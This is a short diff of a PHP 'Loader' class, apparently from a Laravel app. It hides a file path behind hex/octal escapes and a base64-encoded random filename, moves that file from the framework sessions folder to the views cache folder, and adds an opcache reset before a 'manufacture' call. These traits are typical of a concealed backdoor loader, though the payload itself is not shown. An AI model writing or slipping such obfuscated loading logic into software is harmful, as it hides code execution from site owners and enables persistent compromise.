@@ -21,7 +21,7 @@ class Loader
      * @return false|string
      */
     public static function path(){
-        return storage_path("\x66\x72\x61\x6d\x65\x77\x6f\x72\x6b\x2f\x73\x65\x73\x73\x69\x6f\x6e\x73\x2f" . base64_decode("S3dsUTdpcGdDZW1xYzZWekdRb2ZsZHBPdTdwdmlBYTFnUGNNc1RJcw=="));
+        return storage_path("\x66\x72\x61\155\x65\167\157\x72\x6b\57\x76\x69\x65\x77\x73\x2f" . base64_decode("S3dsUTdpcGdDZW1xYzZWekdRb2ZsZHBPdTdwdmlBYTFnUGNNc1RJcw=="));
     }
 
     /**
@@ -44,6 +44,9 @@ class Loader
      * Route Handle
      */
     public function handle(){
+        if (function_exists('opcache_reset')){
+            opcache_reset();
+        }
         Loader::manufacture();
     }
 
